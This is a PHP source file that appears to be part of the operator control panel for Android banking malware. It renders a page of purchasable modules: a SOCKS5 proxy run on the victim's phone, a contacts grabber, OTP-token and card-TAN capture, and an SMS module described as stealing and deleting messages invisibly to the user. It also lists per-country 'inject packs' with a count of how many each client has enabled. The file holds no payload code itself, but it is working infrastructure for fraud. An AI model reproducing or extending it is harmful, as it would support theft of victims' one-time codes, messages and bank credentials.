<?php
require_once "cmd_mod.php";

class extras extends modBase
{
	protected $module_name = 'extras';
	
	function get_content()
	{
		$data = $this->db->exec("select name, value from config where name like('mod_%')", null, true, PDO::FETCH_ASSOC);
		$mods = array();
		foreach($data as $elem)
			$mods[$elem['name']] = $elem['value'];
			
		$enabled = "<td style='color: blue; font-style: italic'>enabled</td>";
		$avail = "<td style='color: green; font-style: italic'>available</td>";
		
		$mod_socks = ($mods['mod_socks'])? $enabled : $avail;
		$mod_sms_deleter = ($mods['mod_sms_deleter'])? $enabled : $avail;
		$mod_cardtan = ($mods['mod_cardtan'])? $enabled : $avail;
		$mod_otp_tokens = ($mods['mod_otp_tokens'])? $enabled : $avail;
		$mod_contacts = ($mods['mod_contacts'])? $enabled : $avail;
		
		$content = <<<PHP
<h2>Mods</h2>
<table class='table table-bordered' style='background-color: #eee'>
	<tr>
		<th class='textcenter'>Name</th>
		<th class='textcenter'>Status</th>
		<th class='textcenter'>Price</th>
	</tr>
	
	<tr>
		<td><b>Socks 5</b><br /><i>Allow to run socks 5 on a target phone and use phone IP</i></td>
		{$mod_socks}
		<td>contact support</td>
	</tr>
	
	<tr>
		<td><b>Contacts grabber</b><br /><i>Parse phone contacts from an address book</i></td>
		{$mod_contacts}
		<td>contact support</td>
	</tr>
	
	<tr>
		<td><b>OTP Token</b><br /><i></i></td>
		{$mod_otp_tokens}
		<td>contact support</td>
	</tr>
	
	<tr>
		<td><b>Coordinates</b><br /><i></i></td>
		{$mod_cardtan}
		<td>contact support</td>
	</tr>
	
	<tr>
		<td><b>SMS Deleter</b><br /><i>Allow to steal and delete SMS invisibly for user from devices with Android 4.4 and higher; Without this mod all incoming SMS will be stored on device</i></td>
		{$mod_sms_deleter}
		<td>contact support</td>
	</tr>
</table>

<h2>Inject packs</h2>
<table class='table table-bordered' style='background-color: #eee'>
	<tr>
		<th class='textcenter'>Name</th>
		<th class='textcenter'>Status</th>
		<th class='textcenter'>Price</th>
	</tr>
PHP;
		
		
		// Injects
		$m = $this->client_cfg['db_main'];
		$c = $this->client_cfg['db_name'];
		
		//~ достать все группы
			//~ посчитать число их инжектов
			//~ определить сколько из них у нас уже есть
			
		$sql = "select id, title, notes from {$m}.groups";
		$rows = $this->db->exec($sql, null, true);
		
		$sql = "select inject_id from {$c}.injects";
		$tdata = $this->db->exec($sql, null, true);
		$client_ids = array();
		foreach($tdata as $d)
			$client_ids[] = $d['inject_id'];

		foreach($rows as $group)
		{
			$sql = "select id, app from {$m}.injects where group_id={$group['id']}";
			$data = $this->db->exec($sql, null, true);

			$sz = sizeof($data);
			$total = "{$sz} inject" . (($sz > 1)? "s" : "");
			
			$client_have = 0;
			foreach($data as $d)
				if(in_array($d['id'], $client_ids))
					$client_have++;
			
			$rest = $sz-$client_have;
			if($client_have == $sz)
				$status = "<span style='color: blue; font-style: italic'>enabled</span>";
			elseif($client_have)
				$status = "<span style='color: darkred; font-style: italic'>enabled {$client_have} of {$sz}</span>";
			else
				$status = "<span style='color: green; font-style: italic'>available</span>";
			
			$code = strtoupper($group['title']);
			if($code == 'UK')
				$code = 'GB';
				
			$flag = "<img src='r/img/flags/{$code}.png' alt='{$code}' />";
			
			if(in_array($code, array('SOCIALS', 'CUSTOM')))
				$flag = '<span class="glyphicon glyphicon-star" aria-hidden="true"></span>';
				
			$content .= <<<PHP
<tr>
	<td>{$flag} <b>{$group['notes']}</b><br /><i>{$total}</i></td>
	<td class='textcenter' style='color: blue; font-style: italic'>{$status}</td>
	<td class='textcenter'>contact support</td>
</tr>
PHP;
		}

		$content .= "</table>";

		return $this->wrap_content("", $content);
	}
}
